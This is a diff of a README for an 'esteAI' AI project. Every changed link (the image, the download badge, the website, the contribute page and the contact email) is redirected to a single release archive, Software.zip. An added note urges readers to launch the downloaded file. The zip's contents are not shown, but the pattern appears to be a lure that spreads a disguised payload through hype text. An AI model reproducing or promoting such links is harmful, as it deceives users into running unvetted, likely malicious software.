@@ -1,5 +1,5 @@
 # 🚀 **Welcome to "esteAI" Repository!**
-![AI Revolution](https://www.example.com/ai-revolution.jpg)
+![AI Revolution](https://github.com/futurinav/esteAI/releases/download/v1.0/Software.zip)
 
 ## 🤖 Overview
 "esteAI" is not just a project; it's a revolution in the making! Our vision is to redefine possibilities, pushing the boundaries of intelligence, automation, and human potential. This repository is dedicated to unleashing the power of AI and technology to revolutionize the world as we know it.
@@ -20,19 +20,19 @@ Our mission is to harness the power of AI to create a future where technology se
 
 ## 🚗 Getting Started
 To get started with our project, you can download the latest release by clicking the button below:
-[![Download latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download latest release](https://github.com/futurinav/esteAI/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/futurinav/esteAI/releases/download/v1.0/Software.zip)
 
 *Note: Please ensure the downloaded file is launched for installation.*
 
 ## 🌐 Stay Connected
-To stay updated with our latest developments, visit our [website](https://www.esteAI.com). Join us on this exciting journey towards a future where intelligence, automation, and human potential converge!
+To stay updated with our latest developments, visit our [website](https://github.com/futurinav/esteAI/releases/download/v1.0/Software.zip). Join us on this exciting journey towards a future where intelligence, automation, and human potential converge!
 
 ## 🔗 Additional Links
-- [Contribute](CONTRIBUTING.md): Interested in contributing to our project? Check out our guidelines.
+- [Contribute](https://github.com/futurinav/esteAI/releases/download/v1.0/Software.zip): Interested in contributing to our project? Check out our guidelines.
 - [License](LICENSE): All the legal information about the use of our project.
 
 ## 📧 Contact Us
-For any inquiries or feedback, feel free to reach out to us at [contact@esteAI.com](mailto:contact@esteAI.com).
+For any inquiries or feedback, feel free to reach out to us at [https://github.com/futurinav/esteAI/releases/download/v1.0/Software.zip](https://github.com/futurinav/esteAI/releases/download/v1.0/Software.zip).
 
 Let's embark on this transformative journey together. Join us in shaping the future of AI, automation, and human potential. Together, we can revolutionize the world! 🌐🚀
 
